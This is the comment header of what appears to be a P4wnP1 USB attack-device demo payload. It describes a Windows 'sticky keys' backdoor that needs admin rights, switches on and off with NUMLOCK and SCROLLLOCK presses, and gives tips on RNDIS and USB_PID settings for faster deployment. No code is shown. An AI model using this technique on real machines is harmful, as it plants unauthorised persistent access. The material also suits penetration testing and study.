# P4wnP1 demo payload by MaMe82
# ==========================
#
# Sticky keys backdoor
# - needs Admin privs
# - multiple presses to NUMLOCK enable backdoor
# - multiple presses to SCROLLLOCK disable backdoor
#
# Note: RNDIS is enabled for this payload in order to be able to get SSH access
#       but this isn't needed for the payload to work. In fact it should be disabled to shorten the needed time
#       for Windows driver installation (don't forget to change the USB_PID if RNDIS is disabled, to force driver reinstall on Windows)
